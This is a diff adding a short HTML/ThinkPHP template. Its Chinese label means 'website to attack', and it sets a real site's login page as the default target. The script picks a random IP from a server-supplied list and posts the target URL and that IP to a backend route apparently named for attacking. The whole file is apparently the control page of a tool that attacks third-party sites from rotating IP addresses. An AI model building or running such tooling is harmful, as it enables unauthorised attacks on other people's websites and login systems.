@@ -1,0 +1,16 @@
+要攻击的网站：<input id="url" value="http://onebase.org/login/login.html" style="width:1000px;">
+<div id="log">
+</div>
+<script src="http://onebase.org/public/static/ext/adminlte/plugins/jQuery/jquery-2.2.3.min.js"></script>
+<script>
+	var ips = '{$ips}';
+	var ips =  JSON.parse(ips);
+	var len = ips.length;
+	var rand = parseInt(Math.random()*len);
+	
+	console.log(rand);
+	console.log(ips[rand]);
+	$.post('{:url("index/index/gj")}',{'url':$('#url').val(),'ip':ips[rand]},function(data){
+					console.log(data);
+	})	
+</script>
